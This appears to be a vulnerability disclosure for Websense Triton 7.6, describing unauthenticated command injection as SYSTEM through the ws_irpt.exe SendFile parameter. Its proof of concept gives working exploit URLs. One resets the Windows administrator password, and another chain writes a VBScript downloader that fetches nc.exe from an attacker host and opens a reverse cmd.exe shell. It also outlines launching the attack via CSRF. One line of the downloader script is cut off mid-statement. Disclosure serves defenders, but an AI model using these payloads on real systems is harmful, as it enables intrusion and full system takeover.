Description
===========
Websense (Triton 7.6) Unauthenticated remote command execution as SYSTEM

Websense is one of the world's best known web-filter products.

Websense (Triton 7.6) is vulnerable to unauthenticated remote command execution as SYSTEM.

This exploitable via a crafted URL.

There is some character-filtering and substitution in the URL (possibly because this is OS-injection via Perl-injection) these can be worked around, to create/delete/modifiy files, run commands, and ultimately control the system

Many commands can be delivered via a single GET request, so an external attacker could get a reverse-shell payload delivered via CSRF (via any internal user), as long as they can find the proxy address in advance (or guess which subnet it is in).

Technical Details

I. VULNERABILITY
-------------------------
Websense (Triton 7.6) Unauthenticated remote command execution as SYSTEM

II. BACKGROUND
-------------------------
Websense is one of the world's best known web-filter products.

The "Triton" administrative UI allows administration of multiple Websense solutions, including their Email, Web, and DLP products

III. DESCRIPTION
-------------------------
Websense (Triton 7.6) is prone to Unauthenticated remote command execution as SYSTEM.

IV. PROOF OF CONCEPT
-------------------------
Affected URL: https://192.168.233.30:9443/explorer_wse/ws_irpt.exe (though there could be other potential vectors for introducing executed instructions)

Example which changes the Windows Adminstrator account password to "blah"

https://192.168.233.30:9443/explorer_wse/ws_irpt.exe?&SendFile=echo.pdf%26net user administrator blah|

This could be very dangerous if the attacker is internal. Other options are available to external attackers such as uploading and running a reverse shell via CSRF.

This can be done by 1) creating a vbscript downloader application which downloads nc.exe:

https://192.168.233.30:9443/explorer_wse/ws_irpt.exe?&SendFile=echo
.pdf%26echo strUrl %3d ^"http:^" %2b chr(47) %2b chr(47) %2b ^"192.168.233.11^" %2b chr(47) %2b ^"nc.exe^"> http.vbs%26echo StrFile %3d ^"nc.exe^" >> http.vbs%26echo Const HTTPREQUEST_PROXYSETTING_DEFAULT %3d 0
>> http.vbs%26echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG %3d 0 >>
http.vbs%26echo Const HTTPREQUEST_PROXYSETTING_DIRECT %3d 1 >> http.vbs%26echo Const HTTPREQUEST_PROXYSETTING_PROXY %3d 2 >> http.vbs%26echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs,
ts >> http.vbs%26echo   Err.Clear >> http.vbs%26echo   Set http %3d Nothing
>> http.vbs%26echo   Set http %3d
CreateObject(^"WinHttp.WinHttpRequest.5.1^") >> http.vbs%26echo   If http
Is Nothing Then Set http %3d CreateObject(^"WinHttp.WinHttpRequest^") >>
http.vbs%26echo   If http Is Nothing Then Set http %3d
CreateObject(^"MSXML2.ServerXMLHTTP^") >> http.vbs%26echo   If http Is

http.vbs%26echo   http.Open ^"GET^", strURL, False >> http.vbs%26echo  
http.Send >> http.vbs%26echo   varByteArray %3d http.ResponseBody >>
http.vbs%26echo   Set http %3d Nothing >> http.vbs%26echo   Set fs %3d
CreateObject(^"Scripting.FileSystemObject^") >> http.vbs%26echo   Set ts
%3d fs.CreateTextFile(StrFile, True) >> http.vbs%26echo   strData %3d ^"^"
>> http.vbs%26echo   strBuffer %3d ^"^" >> http.vbs%26echo   For lngCounter
%3d 0 to UBound(varByteArray) >> http.vbs%26echo       ts.Write Chr(255 And
Ascb(Midb(varByteArray,lngCounter %2b 1, 1))) >> http.vbs%26echo   Next >>
http.vbs%26echo   ts.Close >> http.vbs%26http.vbs|

2) Running nc.exe

https://192.168.233.30:9443/explorer_wse/ws_irpt.exe?&SendFile=echo.pdf%26nc.exe 192.168.233.11 443 -e cmd.exe|

3) Remote SYSTEM shell on attackers system

nc -lvvp 443
listening on [any] 443 ...
192.168.233.30: inverse host lookup failed: Unknown server error :
Connection timed out

...etc...

As multiple instructions can be delivered in a single GET request it should be easy to launch this attack via CSRF, and because any internal user goes via the proxy the attack can be launched via any internal user clicking on the malicious link or visiting the attackers site with a crafted IMG tag.
